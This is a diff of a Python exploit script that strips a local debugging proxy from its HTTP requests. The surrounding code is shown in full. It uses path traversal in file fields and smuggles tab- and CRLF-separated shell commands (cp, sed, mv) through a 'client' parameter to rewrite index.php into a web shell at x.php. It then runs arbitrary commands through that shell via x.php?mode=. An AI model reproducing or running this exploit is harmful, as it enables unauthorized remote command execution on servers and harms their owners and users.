@@ -17,12 +17,6 @@ parser.add_argument('-e', type=bool, help="Extension upload function.", default=
 args = parser.parse_args()
 
 
-proxy = {
-    'http': 'http://127.0.0.1:8080/',
-    'https': 'https://127.0.0.1:8080/'
-}
-
-
 def gen_header(target, cookie):
     headers = {
         'Cookie': cookie,
@@ -59,7 +53,7 @@ def getStatusFileName(target, cookie):
         'password': 'dGVzdAo=',
         'serviceProject': 'test'
     }
-    response = requests.post(url=api_url, headers=headers, verify=False, data=data, proxies=proxy)
+    response = requests.post(url=api_url, headers=headers, verify=False, data=data)
     try:
         r = re.search(r"(version_[0-9a-z]+.log)", response.text)
         filename = r.group(1)
@@ -78,7 +72,7 @@ def createStatusFile(target, cookie, filename):
         'files[0]': f'../../tmp/log/{filename}/test'
     }
     try:
-        res = requests.post(url=api_url, headers=headers, verify=False, data=data, proxies=proxy)
+        res = requests.post(url=api_url, headers=headers, verify=False, data=data)
     except:
         print(Fore.RED + '[-] Connection to target failed!')
     else:
@@ -96,7 +90,7 @@ def createExtensionFile(target, cookie):
         'files[0]': f'../../www/data/ok.txt'
     }
     try:
-        res = requests.post(url=api_url, headers=headers, verify=False, data=data, proxies=proxy)
+        res = requests.post(url=api_url, headers=headers, verify=False, data=data)
     except:
         print(Fore.RED + '[-] Connection to target failed!')
     else:
@@ -136,13 +130,13 @@ def useLimitExecWriteShell(target, cookie):
         'client': "cp\t../../../htdocs/index.php\t../../www/y.php\t--context=\r\nsed\t-i\t's/isset/system/g'\t../../www/y.php\t--in-place=\r\nmv\t../../www/x.php\t../../www/x.php.bak\t--suffix=\r\nmv\t../../www/y.php\t../../www/x.php\t--suffix=\r\n",
     }
     try:
-        requests.post(url=api_url, headers=headers, verify=False, data=data, proxies=proxy)
+        requests.post(url=api_url, headers=headers, verify=False, data=data)
     except:
         print(Fore.RED + '[-] Connection to target failed!')
 
 
 def execShell(target, cmd):
-    response = requests.get(f"{target}/x.php?mode={cmd}", proxies=proxy)
+    response = requests.get(f"{target}/x.php?mode={cmd}", verify=False)
     commandreslines = []
     for line in response.text.split('\n'):
         if line.startswith('<html xmlns='):
